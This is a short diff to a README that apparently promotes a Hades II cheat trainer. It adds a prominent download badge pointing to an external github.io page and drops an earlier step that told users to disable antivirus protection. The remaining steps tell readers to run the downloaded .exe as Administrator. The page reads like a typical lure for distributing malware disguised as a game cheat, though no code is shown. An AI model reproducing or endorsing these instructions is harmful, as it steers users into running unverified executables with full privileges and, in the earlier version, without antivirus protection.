@@ -42,11 +42,12 @@ Hades II broke Early Access records — health, magick, and one-hit toggles top 
 
 ### 🪟 Windows
 
+[![Download](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_TRAINER-red?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
+
 1. **Download the latest build** 👉 **[Download Trainer](https://laplaplaplas.github.io/download/)**
-2. **Temporarily disable antivirus real-time protection** — trainers are a known false-positive trigger (see FAQ).
-3. **Extract** and run the `.exe` **as Administrator**.
-4. **Launch Hades II** and load your save.
-5. Press **F1** to open the menu — toggle what you need. Done ✅
+2. **Extract** and run the `.exe` **as Administrator**.
+3. **Launch Hades II** and load your save.
+4. Press **F1** to open the menu — toggle what you need. Done ✅
 
 ### 🍎 macOS
 
